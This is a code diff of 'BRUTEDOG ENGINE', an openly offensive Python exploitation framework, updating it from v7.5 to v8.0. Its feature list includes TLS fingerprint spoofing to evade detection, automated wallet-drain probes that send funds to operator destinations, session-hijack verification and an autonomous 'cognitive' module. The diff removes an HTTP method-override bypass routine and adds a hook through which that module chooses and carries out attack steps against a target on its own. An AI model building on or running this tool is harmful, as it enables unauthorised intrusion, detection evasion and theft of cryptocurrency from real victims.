@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-BRUTEDOG ENGINE v7.5 — State-Machine Logic & High-Aggression Exploitation Engine
+BRUTEDOG ENGINE v8.0 — State-Machine Logic & Cognitive Supreme Exploitation Engine
 Features:
 - Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & Poisson behavioral jitter)
 - Integrated with BruteDog Scanner V2.0 for asynchronous TCP recon, service ID, and TLS/security header auditing
@@ -12,8 +12,8 @@ Features:
 - Active Multi-Chain Liquidity Auditor & Transaction Signer/Broadcaster integration
 - Automated Wallet Drain Probe Integration using operator destinations & dynamic target ingestion
 - Automated Referral Validation Gateway Fuzzing Integration (test_referral.py)
-- Autonomous Cognitive Reasoning Operator integration for live tactical pivoting & error analysis
-- Zero-disk in-memory intelligence collection & live telemetry streaming
+- Fully Synchronized Autonomous Cognitive Reasoning Operator (Active 36-Module Supreme Dispatcher)
+- Zero-disk in-memory intelligence collection & live terminal telemetry streaming
 """
 import asyncio
 import json
@@ -123,7 +123,7 @@ def section(title):
     sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
     sys.stdout.flush()
 
-# Initialize the Cognitive Reasoning Brain globally for the engine session
+# Initialize the Cognitive Supreme Commander Brain globally for the engine session
 cognitive_brain = CognitiveOperator()
 
 # ============================================================
@@ -175,7 +175,7 @@ def inspect_cookie_security(headers):
         issues.append("SameSite attribute missing")
     return issues
 
-def classify_and_adapt(response, current_payload, endpoint="", transport=None, fingerprinter=None):
+def classify_and_adapt(response, current_payload, endpoint="", transport=None, fingerprinter=None, target_url=None):
     status = response.get("status", 0)
     body = response.get("body", "")
     headers = response.get("headers", {})
@@ -187,30 +187,25 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
         if is_fp:
             return [], []
     
-    # Run the response through the Cognitive Reasoning Operator
-    cognitive_insight = cognitive_brain.analyze_response(endpoint, status, headers, body)
-    if cognitive_insight.get("suggested_action") != "CONTINUE_STANDARD_CRAWL":
-        sys.stdout.write(f"\n{MAGENTA}[COGNITIVE BRAIN] Tactical Pivot Triggered: {cognitive_insight['suggested_action']}{RESET}\n")
-        sys.stdout.write(f"  └── Reasoning: {CYAN}{cognitive_insight['reasoning']}{RESET}\n")
-        
-        # Execute automated cognitive pivot if transport is available
-        if transport and cognitive_insight["suggested_action"] == "HTTP_METHOD_OVERRIDE":
-            override_headers = dict(transport.headers) if hasattr(transport, 'headers') else {}
-            override_headers.update({"X-HTTP-Method-Override": "GET"})
-            sys.stdout.write(f"  └── {YELLOW}[*] Executing cognitive HTTP method override probe against {endpoint}...{RESET}\n")
-            
-            try:
-                retry_status, _, retry_body = transport.request("GET", endpoint)
-                if retry_status in [200, 201]:
-                    success(f"[!!!] COGNITIVE PIVOT SUCCESSFUL! Method restriction bypassed on {endpoint} [HTTP {retry_status}]")
-                    stream_proof("COGNITIVE_METHOD_BYPASS", endpoint, current_payload, retry_body, {"bypass_status": retry_status})
-                    findings.append({
-                        "type": "COGNITIVE_METHOD_OVERRIDE_SUCCESS",
-                        "evidence": f"Successfully bypassed method restriction on {endpoint}",
-                        "status": retry_status
-                    })
-            except Exception as e:
-                warning(f"Cognitive pivot request error: {e}")
+    # ========================================================
+    # COGNITIVE SUPREME COMMANDER EXECUTION HOOK
+    # ========================================================
+    cognitive_result = cognitive_brain.evaluate_and_execute(
+        endpoint=endpoint,
+        status=status,
+        headers=headers,
+        body=body,
+        transport=transport,
+        target_url=target_url
+    )
+    
+    if cognitive_result.get("success"):
+        findings.append({
+            "type": "COGNITIVE_AUTONOMOUS_PIVOT_SUCCESS",
+            "evidence": cognitive_result.get("reasoning"),
+            "status": status
+        })
+    # ========================================================
 
     # Strict SPA Shell Defense: Ignore generic client-side React/Next.js router shells
     is_spa_shell = (
@@ -282,7 +277,7 @@ def verify_hijacked_session(transport):
 # ============================================================
 # ACTIVE ADAPTIVE ENDPOINT TESTING
 # ============================================================
-def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, fingerprinter=None):
+def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, fingerprinter=None, target_url=None):
     endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
     info(f"Targeting endpoint (State-Machine Adaptive Mode): {endpoint}")
     results = []
@@ -317,7 +312,9 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
             continue
             
         res_obj = {"status": status, "headers": headers, "body": body}
-        findings, dynamic_mutations = classify_and_adapt(res_obj, current_test["payload"], endpoint=endpoint, transport=transport, fingerprinter=fingerprinter)
+        findings, dynamic_mutations = classify_and_adapt(
+            res_obj, current_test["payload"], endpoint=endpoint, transport=transport, fingerprinter=fingerprinter, target_url=target_url
+        )
         
         if findings:
             results.append({
@@ -340,7 +337,7 @@ def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None, f
 # ENGINE ORCHESTRATOR
 # ============================================================
 async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
-    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v7.5 (COGNITIVE)")
+    section("BRUTEDOG STATE-MACHINE LOGIC EXPLOITATION ENGINE v8.0 (COGNITIVE COMMANDER)")
     try:
         if target_host:
             target_url = target_host.strip()
@@ -475,7 +472,7 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
     async def worker(path):
         async with semaphore:
             return await asyncio.to_thread(
-                test_endpoint, transport, path, credentials_list, leaked_secrets, fingerprinter
+                test_endpoint, transport, path, credentials_list, leaked_secrets, fingerprinter, target_url
             )
             
     tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
